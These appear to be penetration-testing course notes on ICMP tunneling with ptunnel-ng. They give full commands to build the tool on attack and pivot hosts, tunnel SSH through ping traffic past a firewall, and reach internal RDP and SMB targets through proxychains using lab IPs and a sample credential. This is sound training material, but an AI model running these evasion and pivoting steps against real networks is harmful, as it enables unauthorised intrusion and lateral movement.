# NOTE — ICMP Tunneling with ptunnel‑ng

## ID
612

## Module
Pivoting, Tunneling, and Port Forwarding

## Kind
notes

## Title
Section 13 — ICMP Tunneling with ptunnel‑ng

## Description
Use ptunnel‑ng to encapsulate TCP traffic inside ICMP echo packets, enabling pivoting through firewalls that block most outbound traffic but allow ping.

## Tags
icmp-tunneling, ptunnel-ng, pivoting, firewall-evasion

## Commands
- `git clone https://github.com/utoni/ptunnel-ng.git`
- `cd ptunnel-ng && ./autogen.sh`
- `scp -r ~/ptunnel-ng ubuntu@<PIVOT_IP>:~/`
- `cd ~/ptunnel-ng && touch aclocal.m4 configure Makefile.in src/Makefile.in src/config.h.in && make -C src`
- `sudo ./ptunnel-ng -r<PIVOT_IP> -R22`
- `sudo ./ptunnel-ng -p<PIVOT_IP> -l2222 -r<PIVOT_IP> -R22`
- `ssh -D 9050 -p 2222 -l ubuntu 127.0.0.1`
- `ss -tlnp | grep 9050`
- `proxychains nmap -sT -Pn -p 3389 <internal-target>`
- `proxychains xfreerdp /v:<internal-target> /u:user /p:'password' /cert:ignore`
- `proxychains smbclient \\\\<internal-target>\\C$ -U user%'password'`

## What This Section Covers
ICMP tunnelling sends TCP traffic inside ICMP echo request/reply packets (ping). This works when a firewall blocks most outbound TCP/UDP but allows ping. The pivot host runs a ptunnel‑ng server that listens for ICMP packets and translates them to TCP connections to an internal target. Your attack host runs the ptunnel‑ng client, creating a local TCP port (2222) that tunnels through ICMP. You then SSH over that tunnel and create a SOCKS proxy (via `-D 9050`) to reach internal resources.

## Methodology
1. **Clone and build ptunnel‑ng** on attack host – run `./autogen.sh`.
2. **Copy the source folder** to the pivot host (`scp`).
3. **Build on the pivot** – if libcrypto version mismatches, use `touch` to bypass autoreconf, then `make -C src`.
4. **Start server on pivot** – `sudo ./ptunnel-ng -r<PIVOT_IP> -R22` (forwards tunneled traffic to TCP port 22).
5. **Start client on attack host** – `sudo ./ptunnel-ng -p<PIVOT_IP> -l2222 -r<PIVOT_IP> -R22`.
6. **SSH through the tunnel** – `ssh -D 9050 -p 2222 -l ubuntu 127.0.0.1` (this also creates a SOCKS proxy).
7. **Use proxychains** with `socks4 127.0.0.1 9050` to access internal targets.

## Multi-step Workflow
```bash
# Attack host
git clone https://github.com/utoni/ptunnel-ng.git
cd ptunnel-ng
./autogen.sh
scp -r ~/ptunnel-ng ubuntu@<PIVOT_IP>:~/

# Pivot host
cd ~/ptunnel-ng
touch aclocal.m4 configure Makefile.in src/Makefile.in src/config.h.in
make -C src
sudo ./ptunnel-ng -r172.16.5.129 -R22   # replace with pivot's IP

# Attack host (another terminal)
cd ~/ptunnel-ng
sudo ./ptunnel-ng -p172.16.5.129 -l2222 -r172.16.5.129 -R22

# Attack host (third terminal)
ssh -D 9050 -p 2222 -l ubuntu 127.0.0.1
# Keep this SSH session open, then in another terminal:
proxychains nmap -sT -Pn -p 3389 172.16.5.19
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:'pass@123' /cert:ignore

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|pivoting-tunneling]]  
← [[11-rpivot]] | [[17-detection-prevention]] →
<!-- AUTO-LINKS-END -->
